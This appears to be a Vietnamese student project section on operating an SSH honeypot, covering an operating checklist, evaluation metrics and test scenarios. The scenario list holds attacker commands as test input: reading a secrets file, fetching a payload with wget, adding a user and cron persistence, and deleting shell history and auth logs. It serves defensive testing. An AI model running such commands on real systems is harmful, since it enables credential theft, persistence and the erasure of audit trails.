# Phần Operate cho CDIO 4

## Quy trình vận hành đề xuất

1. Kiểm tra cấu hình `.env`, đổi mật khẩu quản trị.
2. Khởi động Docker Compose và kiểm tra `/api/health`.
3. Kiểm tra cổng SSH `2222` và dashboard `8000`.
4. Theo dõi session, command, alert và tài nguyên máy chủ.
5. Phân loại cảnh báo, xác nhận cảnh báo đã xử lý.
6. Cập nhật rule khi có false positive hoặc hành vi mới.
7. Sao lưu volume SQLite và SSH host key.
8. Khởi động lại dịch vụ và kiểm chứng dữ liệu phục hồi.
9. Định kỳ tổng hợp số phiên, top command, severity và MITRE technique.
10. Ghi nhận sự cố vận hành và thời gian khôi phục.

## Chỉ số đánh giá

- Số phiên đồng thời xử lý được.
- Thời gian phản hồi trung bình mỗi lệnh.
- Tỷ lệ phát hiện đúng trên bộ test command.
- Tỷ lệ false positive.
- Tỷ lệ phiên được phân loại đúng.
- Uptime của web và SSH listener.
- Thời gian khôi phục sau khi container dừng.
- Tính nhất quán của filesystem trong một phiên.

## Kịch bản kiểm thử

- Benign: `pwd`, `ls`, `cat notes.txt`.
- Discovery: `whoami`, `uname -a`, `ss -tulpn`.
- Credential access: `cat /opt/inventory-api/.env`.
- Transfer: `wget http://example.test/payload`.
- Persistence: `useradd backup2`, `crontab -e`.
- Reverse shell: chuỗi mẫu trong mạng lab, không kết nối ra ngoài.
- Cleanup: `history -c`, `rm /var/log/auth.log`.

Mọi kịch bản chỉ được nhập vào honeypot; không thực thi trên hệ điều hành thật.
